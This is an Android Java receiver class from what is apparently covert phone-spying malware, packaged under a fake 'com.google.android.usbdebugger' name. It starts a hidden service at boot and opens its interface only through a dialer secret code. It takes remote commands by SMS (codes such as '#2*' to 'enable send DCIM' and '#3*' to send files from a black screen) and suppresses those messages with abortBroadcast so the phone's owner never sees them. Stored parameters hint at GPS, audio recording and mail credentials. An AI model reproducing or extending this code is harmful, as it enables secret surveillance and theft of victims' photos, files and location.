package com.google.android.usbdebugger;

import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;


public class BootDeviceReceiver_old extends BroadcastReceiver
{
    private String DateTime() {
        Date dt = new Date();
        @SuppressLint("SimpleDateFormat")
        SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
        String daa = ft2.format(dt);
        return daa;
    }

    private DBHelper dbh;
    private SQLiteDatabase db;
    //private static final String TAG_BOOT = "BOOT_BROADCAST_RECEIVER";

    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final String SECRET_ACTION = "android.provider.Telephony.SECRET_CODE";
    private ArrayList aa = null;
    private String SmsStat = "1";

 /*   public void FormOpen(final Context cn, final String ss) {
        Intent mIntent = new Intent(cn, MyService.class);
        mIntent.putExtra("sms_body", ss);
        if (ss.equals("#1#")) {
            cn.stopService(mIntent);
        } else {
            cn.startService(mIntent);
        }
    }*/

    public void createParams(Context context, ArrayList param){
        dbh = new DBHelper(context);
        db = dbh.getWritableDatabase();
        try {
            ContentValues data = new ContentValues();
            data.put("VC", param.get(0).toString());
            data.put("SC", param.get(1).toString());
            data.put("FT", param.get(2).toString());
            data.put("PT", param.get(3).toString());
            data.put("FD", param.get(4).toString());
            data.put("US", param.get(5).toString());
            data.put("PS", param.get(6).toString());
            data.put("GP", param.get(7).toString());
            data.put("GP_T", param.get(8).toString());
            data.put("CN", param.get(9).toString());
            data.put("MS", param.get(10).toString());
            data.put("DC", param.get(11).toString());
            data.put("PR", param.get(12).toString());//BlackScreen TEXT, SMSEnable TEXT
            data.put("BS", param.get(13).toString());
            data.put("SM", param.get(14).toString());
            data.put("MI", param.get(15).toString());
            data.put("FLC", param.get(16).toString());
            data.put("RS", param.get(17).toString());
            data.put("DBC", param.get(18).toString());
            data.put("SH", param.get(19).toString());

            db.update("Parametrs", data, "1=1", null);

        }
        catch (Exception ex){
            dbh.insert_Exeption(db, "createParams()Update","Exception", ex.getMessage(), DateTime());
        }
    }

    void InsertParametrs(Context context, Intent intent, String VoiceRec) {
        aa = null;
        aa = intent.getIntegerArrayListExtra("Array");
        createParams(context, aa);
        SmsStat = aa.get(14).toString();
        try {
            if (VoiceRec.contains("Close")) {
                Intent mIntent = new Intent(context, MyService.class);
                mIntent.putExtra("sms_body", "#100*");//body
                mIntent.putParcelableArrayListExtra("Array", aa);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
                //context.startService(mIntent);
            }
            aa = null;
        } catch (SQLException e) {
            dbh.insert_Exeption(db, "InsertParametrs()","SQLException", e.getMessage(), DateTime());
            aa = null;
        } catch (Exception ex) {
            dbh.insert_Exeption(db, "InsertParametrs()","Exception", ex.getMessage(), DateTime());
            aa = null;
        }
    }

    @Override
    public void onReceive(Context context, Intent intent)
    {
        String action = intent.getAction();

        if(action.equals("REFRESH_THIS"))
        {
            try {
                Thread.sleep(2000);
                String ss = intent.getSerializableExtra("sms_body").toString();
                InsertParametrs(context, intent, ss);
            } catch (InterruptedException ex) {
                dbh.insert_Exeption(db, "onReceive() REFRESH_THIS","InterruptedException", ex.getMessage(), DateTime());
            }
        }

        if(action.equals(SECRET_ACTION)) {

            String ss = intent.getDataString();
            if(ss.equals("android_secret_code://1")) {
                try {
                    Intent mIntent = new Intent(context, MainActivity.class);//SmsService context, MainActivity.class
                    mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    if (Build.VERSION.SDK_INT < 28) {
                        context.startActivity(mIntent);
                        //context.startService(mIntent);
                    } else {
                        context.startActivity(mIntent);
                        //context.startForegroundService(mIntent);
                    }

                    //context.startActivity(mIntent);
                }
                catch (ActivityNotFoundException ex) {
                    Log.e("ERR1 Activit", "ActivityNotFoundException" + ex.getLocalizedMessage());
                }
                /*PendingIntent restartIntent = PendingIntent.getActivity(context, 0, mIntent, PendingIntent.FLAG_ONE_SHOT);
                AlarmManager mgr = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    mgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + restartTime, restartIntent);

                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    mgr.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + restartTime, restartIntent);
                }*/


            }
            /*if(ss.equals("android_secret_code://5552")) {
                Intent mIntent = new Intent(context, Main2Activity.class);//SmsService context, MainActivity.class
                mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(mIntent);
            }*/
        }

        //Log.d(TAG_BOOT, action);



        if(Intent.ACTION_BOOT_COMPLETED.equals(action))
        {
            Intent mIntent = new Intent(context, MyService.class);
            mIntent.putExtra("sms_body", "StartUp");//body
            //mIntent.addFlags(START_REDELIVER_INTENT);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(mIntent);
            } else {
                context.startService(mIntent);
            }

//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                context.startForegroundService(intent);
//            } else {
//                context.startService(intent);
//            }

            //context.startService(mIntent);
            //Log.d(TAG_BOOT, action);
        }
        /*try {
            dbh = new DBHelper(context);
            db = dbh.getWritableDatabase();
            aa = new ArrayList();
            aa = dbh.SelectParametrs(db);
        }catch (Exception ex){
            Log.e("ERR1", "aa = dbh.SelectParametrs(db): "+ex.getMessage());
        }

        if(aa!=null) {
            if (aa.get(16).toString().equals("1")) {
                SmsStat = "1";
            }
            else {
                SmsStat = "0";
            }
        }*/

        if(aa== null && SmsStat.equals("1")) {
            if (intent != null && intent.getAction() != null &&
                    ACTION.compareToIgnoreCase(intent.getAction()) == 0) {

                Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
                SmsMessage[] messages = new SmsMessage[pduArray.length];

                for (int i = 0; i < pduArray.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
                }

                String sms_from = messages[0].getMessageBody();//.getDisplayOriginatingAddress();
                if (sms_from.equalsIgnoreCase("#1*")) {
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#1#")) {
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.contains("#2*")) {//enable send DCIM
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#2#")) {//disable send DCIM
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#3*")) {//enable send files from black screen
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#3#")) {//disable send files from black screen
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#4*")) {//disable send files from black screen
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#4#")) {//disable send files from black screen
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#5*")) {//disable send files from black screen
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#5#")) {//disable send files from black screen
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#10#")) {//disable send files from black screen
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);//body
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#100*")) {
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.startService(mIntent);
                    abortBroadcast();
                }
                if (sms_from.equalsIgnoreCase("#100#")) {
                    Intent mIntent = new Intent(context, MyService.class);//SmsService
                    mIntent.putExtra("sms_body", sms_from);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }

                    //context.stopService(mIntent);
                    abortBroadcast();
                }
            }
        }
    }
}